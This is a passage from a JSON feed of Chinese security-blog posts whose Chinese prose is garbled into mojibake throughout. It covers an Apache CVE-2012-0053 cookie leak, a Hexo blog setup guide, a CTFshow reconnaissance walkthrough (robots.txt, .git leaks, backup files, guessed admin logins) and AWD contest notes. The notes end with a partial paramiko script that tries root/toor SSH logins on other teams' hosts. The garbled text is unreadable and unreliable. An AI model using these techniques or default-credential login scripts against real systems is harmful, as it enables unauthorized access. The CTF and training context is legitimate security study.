cve-2012-0053</h4>\n<p>Apache æœåŠ¡å™¨åœ¨ 2.2.0-2.2.21 ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å‘ç½‘ç«™æ¤å…¥ä¸€ä¸ªè¶…å¤§çš„ cookieï¼Œä»¤å…¶ HTTP å¤´è¶…è¿‡ Apache çš„æœ€å¤§è¯·æ±‚é•¿åº¦ï¼ˆ4192 å­—èŠ‚ï¼‰ï¼Œä½¿å¾— apache è¿”å› 400 é”™è¯¯ï¼ŒçŠ¶æ€ä¹Ÿä¸­åŒ…å«äº† HTTPonly ä¿æŠ¤çš„ Cookie</p>\n<h4 id=\"phpinfoé¡µé¢\"><a class=\"anchor\" href=\"#phpinfoé¡µé¢\">#</a> phpinfo é¡µé¢</h4>\n<p>æ— è®ºè®¾ç½®æ˜¯å¦è®¾ç½®äº† HTTPonly åœ¨ phpinfo ä¸­éƒ½èƒ½çœ‹åˆ° Cookie</p>\n",
            "tags": [
                "Web",
                "XSS"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/",
            "url": "https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/",
            "title": "hexo+githubæ­å»ºä¸ªäººåšå®¢",
            "date_published": "2022-10-24T16:00:00.000Z",
            "content_html": "<p>åº”é‚€æ­å»ºä¸€ä¸ªå°åšå®¢ï¼Œhexo+github æ­å»ºæ–¹ä¾¿ï¼ˆé‡ç‚¹æ˜¯å¯ä»¥ç™½å«–ï¼‰</p>\n<h3 id=\"ç¯å¢ƒé…ç½®\"><a class=\"anchor\" href=\"#ç¯å¢ƒé…ç½®\">#</a> ç¯å¢ƒé…ç½®</h3>\n<p>å®‰è£… node.js----<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==\">Node.js å®˜ç½‘</span></p>\n<p>å®‰è£…å®Œæˆåï¼Œä½¿ç”¨å‘½ä»¤ node -vï¼Œå‡ºç°ä¸‹é¢çš„ä¿¡æ¯åˆ™è¯æ˜å®‰è£…æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204221944.png\" alt=\"image-20221007204221944\" /></p>\n<p>å®‰è£… git</p>\n<p>å®‰è£…æˆåŠŸåæ‰§è¡Œå‘½ä»¤ git --version</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204532427.png\" alt=\"image-20221007204532427\" /></p>\n<p>GitHub ä¸Šé¢å»ºç«‹æ–°çš„å‚¨å­˜åº“</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007211507554.png\" alt=\"image-20221007211507554\" /></p>\n<p>è¿™é‡Œæœ‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼Œ<span class=\"exturl\" data-url=\"aHR0cDovL3huLS00Z3FhMDY3YmJhMjQ0Z3NsYTU4MGJkd2hlYTQ0NDlhYzE5Yi5naXRodWIuaW8=\">ä¸€æ˜¯åå­—ä¸€å®šè¦æ˜¯ç”¨æˆ·å.github.io</span> (ä¸ç„¶ä¼šæœ‰å¾ˆå¤šé—®é¢˜)</p>\n<p>è¿›å…¥å»ºå¥½çš„é¡¹ç›®çš„è®¾ç½®æŒ‰é’®ä¸­</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007212119905.png\" alt=\"image-20221007212119905\" /></p>\n<p>æ‰“å¼€è¿™ä¸ªé“¾æ¥å°±å·²ç»æœ‰éƒ¨ç½²åˆ°ç½‘ç»œä¸Šé¢çš„ç½‘é¡µ</p>\n<h3 id=\"å®‰è£…hexo\"><a class=\"anchor\" href=\"#å®‰è£…hexo\">#</a> å®‰è£… hexo</h3>\n<p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å­˜æ”¾éƒ¨ç½²åœ¨æœ¬åœ°çš„æ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©æ”¾åœ¨ F ç›˜</p>\n<p>åœ¨ dos å‘½ä»¤æ¡†ä¸­è¾“å…¥</p>\n<ul>\n<li>\n<p>npm install hexo -gï¼Œå¼€å§‹å®‰è£… Hexo</p>\n</li>\n<li>\n<p>æ¼«é•¿ç­‰å¾…å®‰è£…å®Œæˆåï¼Œè¾“å…¥ hexo æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214045244.png\" alt=\"image-20221007214045244\" /></p>\n</li>\n<li>\n<p>è¾“å…¥ hexo init åˆå§‹åŒ–æ–‡ä»¶å¤¹ï¼ˆè¿™ä¸ªæ›´æ…¢ï¼Œå¾ˆçƒ¦ä¸‹å®Œä¸¤å±€è±¡æ£‹æ‰ç»“æŸï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214356434.png\" alt=\"image-20221007214356434\" /></p>\n</li>\n<li>\n<p>è¾“å…¥ npm installï¼Œå®‰è£…ç»„ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214417379.png\" alt=\"image-20221007214417379\" /></p>\n</li>\n<li>\n<p>è¾“å…¥ hexo s å¼€å¯æœåŠ¡å™¨ï¼Œè®¿é—®è¯¥ç½‘å€</p>\n</li>\n</ul>\n<h3 id=\"gitç»‘å®šgithubè´¦å·\"><a class=\"anchor\" href=\"#gitç»‘å®šgithubè´¦å·\">#</a> Git ç»‘å®š GIthub è´¦å·</h3>\n<p>åœ¨ blog æ–‡ä»¶å¤¹é‡Œï¼Œå³é”®é€‰æ‹© Git Base Here</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$ git config --global user.name â€œè´¦å·â€\n$ git config --global user.email â€œé‚®ç®±â€<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>è¾“å…¥ ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ç®±&quot;ï¼Œæ— è„‘è¿ç»­ä¸‰ä¸ªå›è½¦</p>\n<p>ç™»å½• Githubï¼Œç‚¹å‡»å¤´åƒä¸‹çš„ settingsï¼Œç‚¹å‡»ä¾§è¾¹æ  SSH and GPG keysï¼Œå†ç‚¹å‡» Add SSH Keyï¼Œåœ¨ title å¤„å¡«å…¥ä»»æ„çš„æ ‡è¯†ï¼Œåœ¨ Key éƒ¨åˆ†é‡Œé¢æ·»åŠ åˆšæ‰å¤åˆ¶çš„ id_rsa.pub æ–‡ä»¶é‡Œçš„å†…å®¹ï¼Œç‚¹å‡»æ·»åŠ å³å¯</p>\n<p>è¾“å…¥ ssh -T <span class=\"exturl\" data-url=\"bWFpbHRvOmdpdEBnaXRodWIuY29t\">git@github.com</span>, å‡ºç°ä½ çš„ç”¨æˆ·ååˆ™æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007221435449.png\" alt=\"image-20221007221435449\" /></p>\n<h3 id=\"é…ç½®deployment\"><a class=\"anchor\" href=\"#é…ç½®deployment\">#</a> é…ç½® Deployment</h3>\n<p>åœ¨ blog ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°_config.yml æ–‡ä»¶ï¼Œä¿®æ”¹ repo å€¼ï¼ˆåœ¨æœ«å°¾ï¼‰</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">deploy:\n\ttype: git \n\trepository: git@github.com:WShaobin&#x2F;WShaobin.github.io.git\n\tbranch: master<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>repository å€¼æ˜¯ä½ åœ¨ github é¡¹ç›®é‡Œçš„ sshï¼ˆå³ä¸‹è§’ï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223433959.png\" alt=\"image-20221007223433959\" /></p>\n<h3 id=\"éƒ¨ç½²åˆ°github\"><a class=\"anchor\" href=\"#éƒ¨ç½²åˆ°github\">#</a> éƒ¨ç½²åˆ° GitHub</h3>\n<p>å³é”® git bash here æ‰§è¡Œå‘½ä»¤ï¼š <code>hexo new post â€œæ–‡ç« â€</code>  æˆ– <code>hexo new â€œæ–‡ç« â€</code></p>\n<p>è¿™æ—¶å€™åœ¨æ–‡ä»¶å¤¹_posts ç›®å½•ä¸‹å°†ä¼šçœ‹åˆ°å·²ç»åˆ›å»ºçš„æ–‡ä»¶</p>\n<p>åœ¨ç”Ÿæˆä»¥åŠéƒ¨ç½²æ–‡ç« ä¹‹å‰ï¼Œéœ€è¦å®‰è£…ä¸€ä¸ªæ‰©å±•ï¼š <code>npm install hexo-deployer-git --save</code></p>\n<p>ä½¿ç”¨ç¼–è¾‘å™¨ç¼–å¥½æ–‡ç« ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š <code>hexo d -g</code> ï¼Œç”Ÿæˆä»¥åŠéƒ¨ç½²äº†</p>\n<p>éƒ¨ç½²æˆåŠŸåè®¿é—®ä½ çš„åœ°å€ï¼š<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1lcXI5MjRhdnhvLmdpdGh1Yi5pbw==\">http:// ç”¨æˆ·å.github.io</span>ã€‚é‚£ä¹ˆå°†çœ‹åˆ°ç”Ÿæˆçš„æ–‡ç« </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223612104.png\" alt=\"image-20221007223612104\" /></p>\n",
            "tags": [
                "æ‚è®°",
                "hexoåšå®¢æ­å»º"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "CTFshow-webå…¥é—¨ä¿¡æ¯æ”¶é›†",
            "date_published": "2022-10-24T16:00:00.000Z",
            "content_html": "<h2 id=\"web1\"><a class=\"anchor\" href=\"#web1\">#</a> web1</h2>\n<p>CTRL+u è§£å†³</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111225748.png\" alt=\"image-20221025111225748\" /></p>\n<h2 id=\"web2\"><a class=\"anchor\" href=\"#web2\">#</a> web2</h2>\n<p>åŒ web1</p>\n<h2 id=\"web3\"><a class=\"anchor\" href=\"#web3\">#</a> web3</h2>\n<p>http å¤´ä¸­</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111448297.png\" alt=\"image-20221025111448297\" /></p>\n<h2 id=\"web4\"><a class=\"anchor\" href=\"#web4\">#</a> web4</h2>\n<p>æŸ¥çœ‹ robots.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111605443.png\" alt=\"image-20221025111605443\" /></p>\n<p>è®¿é—® /flagishere.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111744010.png\" alt=\"image-20221025111744010\" /></p>\n<h2 id=\"web5\"><a class=\"anchor\" href=\"#web5\">#</a> web5</h2>\n<p>è®¿é—® phps ä¸‹è½½æºç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112204400.png\" alt=\"image-20221025112204400\" /></p>\n<h2 id=\"web6\"><a class=\"anchor\" href=\"#web6\">#</a> web6</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112528587.png\" alt=\"image-20221025112528587\" /></p>\n<p>æœ‰ www.zip, ä¸‹è½½æ‹¿åˆ° flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112615777.png\" alt=\"image-20221025112615777\" /></p>\n<h2 id=\"web7\"><a class=\"anchor\" href=\"#web7\">#</a> web7</h2>\n<p>git çš„æºç æ³„éœ²ï¼Œç›´æ¥è®¿é—®.git/index.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113123637.png\" alt=\"image-20221025113123637\" /></p>\n<h2 id=\"web8\"><a class=\"anchor\" href=\"#web8\">#</a> web8</h2>\n<p>svn æºç æ³„éœ²åŒä¸Š</p>\n<h2 id=\"web9\"><a class=\"anchor\" href=\"#web9\">#</a> web9</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113301899.png\" alt=\"image-20221025113301899\" /></p>\n<p>ä¿®æ”¹æ–‡ä»¶æ—¶æ„å¤–é€€å‡ºï¼Œç”Ÿæˆç¼“å­˜æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113436950.png\" alt=\"image-20221025113436950\" /></p>\n<h2 id=\"web10\"><a class=\"anchor\" href=\"#web10\">#</a> web10</h2>\n<p>æŸ¥çœ‹ http å¤´éƒ¨çš„ cookie å¤´</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123327299.png\" alt=\"image-20221025123327299\" /></p>\n<h2 id=\"web11\"><a class=\"anchor\" href=\"#web11\">#</a> web11</h2>\n<p>åŸŸå dns è§£æï¼Œè®¾ç½®è¯´æ˜</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123858205.png\" alt=\"image-20221025123858205\" /></p>\n<h2 id=\"web12\"><a class=\"anchor\" href=\"#web12\">#</a> web12</h2>\n<p>robots.txt ä¸­å†™äº†åå°ç™»å½•è¿æ¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124214192.png\" alt=\"image-20221025124214192\" /></p>\n<p>ç”¨æˆ·å admin</p>\n<p>å¯†ç ï¼Œé¡µé¢ä¸Šçš„æ‰‹æœºå·<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124407329.png\" alt=\"image-20221025124407329\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124438975.png\" alt=\"image-20221025124438975\" /></p>\n<h2 id=\"web13\"><a class=\"anchor\" href=\"#web13\">#</a> web13</h2>\n<p>é¡µé¢ä¸‹æ–¹å‘ç°è¿™ä¸ª pd èƒ½ä¸‹è½½</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124750410.png\" alt=\"image-20221025124750410\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124715623.png\" alt=\"image-20221025124715623\" /></p>\n<p>pdf ä¸­æœ‰å¯†ç ï¼Œå»å°è¯•ç™»å½•ï¼Œæ‹¿åˆ° flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124945280.png\" alt=\"image-20221025124945280\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125023387.png\" alt=\"image-20221025125023387\" /></p>\n<h2 id=\"web14\"><a class=\"anchor\" href=\"#web14\">#</a> web14</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125246077.png\" alt=\"image-20221025125246077\" /></p>\n<p>å»è®¿é—®ï¼Œæœ‰ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨é¡µé¢ï¼Œå¯»æ‰¾ flag æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125742752.png\" alt=\"image-20221025125742752\" /></p>\n<p>è®¿é—®æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125808264.png\" alt=\"image-20221025125808264\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125522527.png\" alt=\"image-20221025125522527\" /></p>\n<h2 id=\"web15\"><a class=\"anchor\" href=\"#web15\">#</a> web15</h2>\n<p>å‘ç°æœ‰ admin é¡µé¢ï¼Œå…ˆå»è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130005877.png\" alt=\"image-20221025130005877\" /></p>\n<p>æœ‰ç™»å½•é¡µé¢ï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†ç ï¼Œå¿˜è®°å¯†ç éœ€è¦çŸ¥é“åœ°å€</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130113047.png\" alt=\"image-20221025130113047\" /></p>\n<p>ä¸»é¡µæ‰¾åˆ°äº†é‚®ç®±åœ°å€</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130224266.png\" alt=\"image-20221025130224266\" /></p>\n<p>é€šè¿‡ qq å·æŸ¥è¯¢åœ°å€</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130433834.png\" alt=\"image-20221025130433834\" /></p>\n<p>è¿™é‡Œåº”è¯¥æ˜¯æœºå™¨äººèµ„æ–™æ”¹äº†ï¼Œé¢˜ç›®æ²¡æ›´æ–°ï¼Œæ­£ç¡®åœ°å€æ˜¯è¥¿å®‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130628154.png\" alt=\"image-20221025130628154\" /></p>\n<p>ç™»å½•æ‹¿åˆ° flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130719590.png\" alt=\"image-20221025130719590\" /></p>\n<h2 id=\"web16\"><a class=\"anchor\" href=\"#web16\">#</a> web16</h2>\n<p>è®¿é—® tz.php,php æ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’Œ PHP ä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131257496.png\" alt=\"image-20221025131257496\" /></p>\n<p>æ‰“å¼€ phpinfo æ‹¿åˆ° flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131333881.png\" alt=\"image-20221025131333881\" /></p>\n<h2 id=\"web17\"><a class=\"anchor\" href=\"#web17\">#</a> web17</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131929374.png\" alt=\"image-20221025131929374\" /></p>\n<p>è®¿é—®ï¼Œå°†ä¸‹è½½çš„æ–‡ä»¶æ‰“å¼€æ‹¿åˆ° flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025132102118.png\" alt=\"image-20221025132102118\" /></p>\n<h2 id=\"web18\"><a class=\"anchor\" href=\"#web18\">#</a> web18</h2>\n<p>å‰ç«¯çš„éªŒè¯ï¼ŒæŸ¥çœ‹ js</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145134964.png\" alt=\"image-20221025145134964\" /></p>\n<p>åˆ†æ•°å¤§äº 100 åˆ†ä¼šæœ‰å¼¹çª—ï¼Œurl è§£ç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145209107.png\" alt=\"image-20221025145209107\" /></p>\n<p>è®¿é—® 110.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145237831.png\" alt=\"image-20221025145237831\" /></p>\n<h2 id=\"web19\"><a class=\"anchor\" href=\"#web19\">#</a> web19</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145332644.png\" alt=\"image-20221025145332644\" /></p>\n<p>çœ‹åˆ°ç”¨æˆ·åå¯†ç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145912834.png\" alt=\"image-20221025145912834\" /></p>\n<p>ç™»é™†ï¼Œæ‹¿åˆ° flag</p>\n<h2 id=\"web20\"><a class=\"anchor\" href=\"#web20\">#</a> web20</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150253122.png\" alt=\"image-20221025150253122\" /></p>\n<p>è¿™ä¸ªç›®å½•ä¸‹æœ‰ä¸œè¥¿ï¼Œmdb æ–‡ä»¶æ˜¯æ—©æœŸ asp+access æ„æ¶çš„æ•°æ®åº“æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150409063.png\" alt=\"image-20221025150409063\" /></p>\n<p>è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150541323.png\" alt=\"image-20221025150541323\" /></p>\n",
            "tags": [
                "CTFshow",
                "ä¿¡æ¯æ”¶é›†"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "url": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "title": "Awd-webå°ç»“",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"æŸ¥çœ‹æ¯”èµ›ä¿¡æ¯-è§„åˆ™\"><a class=\"anchor\" href=\"#æŸ¥çœ‹æ¯”èµ›ä¿¡æ¯-è§„åˆ™\">#</a> æŸ¥çœ‹æ¯”èµ›ä¿¡æ¯ã€è§„åˆ™</h2>\n<p>æ³¨æ„èµ›æ–¹çš„é™åˆ¶æ¯”å¦‚è¯´æäº¤ flag çš„é—´éš”æ—¶é—´ï¼Œflag çš„è·å–æ–¹å¼ï¼Œé€šé˜²çš„é™åˆ¶ï¼Œå¯¹åé—¨çš„å¤„ç†è¦æ±‚ç­‰è¦æ³¨æ„çš„ç‚¹ï¼Œé¿å… check ä¸¢åˆ†</p>\n<h2 id=\"æ”¹å¯†ç \"><a class=\"anchor\" href=\"#æ”¹å¯†ç \">#</a> æ”¹å¯†ç </h2>\n<p>awd æ¨¡å¼æ¯ä¸ªé˜Ÿä¼ä¼šæœ‰è‹¥å¹²å°æœåŠ¡å™¨éœ€è¦ç»´æŠ¤ï¼Œå¦‚æœä¸»åŠæ–¹å¹³å°ç»™çš„å¯†ç è¾ƒä¸ºç®€å•å­˜åœ¨å¼±å£ä»¤æˆ–è€…å¯èƒ½è¢«çˆ†ç ´æˆåŠŸçš„æœºä¼šï¼Œå°½å¿«ä¿®æ”¹å¯†ç ï¼Œå¯†ç ä¸»è¦æ˜¯ä¸‰ä¸ªæ–¹é¢ï¼š</p>\n<ul>\n<li>ssh è¿æ¥å¯†ç å³æœ¬åœ°å¯†ç </li>\n</ul>\n<p><pre class=\"line-numbers language-ABAP\" data-language=\"ABAP\"><code class=\"language-ABAP\">passwd &#123;ç”¨æˆ·å&#125;\nåšä¿®æ”¹å³å¯<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<ul>\n<li>MySQL ç™»å½•å¯†ç </li>\n</ul>\n<p><pre class=\"line-numbers language-apl\" data-language=\"apl\"><code class=\"language-apl\"><span class=\"token number\">1</span><span class=\"token dyadic-operator operator\">.</span> ä½¿ç”¨ SET PASSWORD å‘½ä»¤\næ­¥éª¤ <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>ï¼šè¾“å…¥å‘½ä»¤mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>pæŒ‡å®š root ç”¨æˆ·ç™»å½• MySQLï¼Œè¾“å…¥åæŒ‰å›è½¦é”®è¾“å…¥å¯†ç ã€‚å¦‚æœæ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡ï¼Œè¯·åœ¨ MySQL çš„ bin ç›®å½•ä¸‹ç™»å½•æ“ä½œã€‚\n\næ­¥éª¤ <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>ï¼šä½¿ç”¨ SET PASSWORD ä¿®æ”¹å¯†ç å‘½ä»¤æ ¼å¼ä¸º set password for username <span class=\"token dyadic-operator operator\">@</span>localhost <span class=\"token function\">=</span> password<span class=\"token punctuation\">(</span>newpwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nï¼Œå…¶ä¸­ username ä¸ºè¦ä¿®æ”¹å¯†ç çš„ç”¨æˆ·åï¼Œnewpwd ä¸ºè¦ä¿®æ”¹çš„æ–°å¯†ç ã€‚\n\n<span class=\"token number\">2</span><span class=\"token dyadic-operator operator\">.</span> ä½¿ç”¨mysqladminä¿®æ”¹å¯†ç \nä½¿ç”¨ mysqladmin å‘½ä»¤ä¿®æ”¹ MySQL çš„ root ç”¨æˆ·å¯†ç æ ¼å¼ä¸º mysqladmin <span class=\"token function\">-</span>uç”¨æˆ·å <span class=\"token function\">-</span>pæ—§å¯†ç  password æ–°å¯†ç ã€‚\n\næ³¨æ„ï¼šä¿®æ”¹å¯†ç çš„å‘½ä»¤ä¸­ <span class=\"token function\">-</span>uroot å’Œ <span class=\"token function\">-</span>proot æ˜¯æ•´ä½“ï¼Œä¸è¦å†™æˆ <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p rootï¼Œ<span class=\"token function\">-</span>u å’Œ root é—´å¯ä»¥åŠ ç©ºæ ¼ï¼Œä½†æ˜¯ä¼šæœ‰è­¦å‘Šå‡ºç°ï¼Œæ‰€ä»¥å°±ä¸è¦åŠ ç©ºæ ¼äº†ã€‚\n\n<span class=\"token number\">3</span><span class=\"token dyadic-operator operator\">.</span> UPDATEç›´æ¥ç¼–è¾‘userè¡¨\næ­¥éª¤ <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>ï¼šè¾“å…¥å‘½ä»¤mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>pæŒ‡å®š root ç”¨æˆ·ç™»å½• MySQLï¼Œè¾“å…¥åæŒ‰å›è½¦é”®è¾“å…¥å¯†ç ã€‚å¦‚æœæ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡ï¼Œè¯·åœ¨ MySQL çš„ bin ç›®å½•ä¸‹ç™»å½•æ“ä½œã€‚\n\næ­¥éª¤ <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>ï¼šè¾“å…¥use mysql<span class=\"token punctuation\">;</span>å‘½ä»¤è¿æ¥æƒé™æ•°æ®åº“ã€‚\n\næ­¥éª¤ <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>ï¼šè¾“å…¥å‘½ä»¤update mysql<span class=\"token dyadic-operator operator\">.</span>user set authentication_string<span class=\"token function\">=</span>password<span class=\"token punctuation\">(</span><span class=\"token string\">'æ–°å¯†ç '</span><span class=\"token punctuation\">)</span> where user<span class=\"token function\">=</span><span class=\"token string\">'ç”¨æˆ·å'</span> and Host <span class=\"token function\">=</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">;</span>è®¾ç½®æ–°å¯†ç ã€‚\n\næ­¥éª¤ <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>ï¼šè¾“å…¥ flush privileges<span class=\"token punctuation\">;</span> å‘½ä»¤åˆ·æ–°æƒé™ã€‚\n\næ­¥éª¤ <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>ï¼šè¾“å…¥quit<span class=\"token punctuation\">;</span>å‘½ä»¤é€€å‡º MySQL é‡æ–°ç™»å½•ï¼Œæ­¤æ—¶å¯†ç å·²ç»ä¿®æ”¹ä¸ºåˆšæ‰è¾“å…¥çš„æ–°å¯†ç äº†ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<ul>\n<li>åå°çš„ç™»å½•å¯†ç </li>\n</ul>\n<p><pre class=\"line-numbers language-ASN.1\" data-language=\"ASN.1\"><code class=\"language-ASN.1\">updata admin set user pass&#x3D;â€™123456â€™;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>å¦‚æœå¯†ç æ˜¯é»˜è®¤çš„å°è¯•åˆ«äººçš„èƒ½å¦ç™»å½•</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n\nip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.137'</span>\nport <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\nusername <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\npasswd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n<span class=\"token comment\"># ssh ç”¨æˆ·å å¯†ç  ç™»é™†</span>\n<span class=\"token keyword\">def</span> 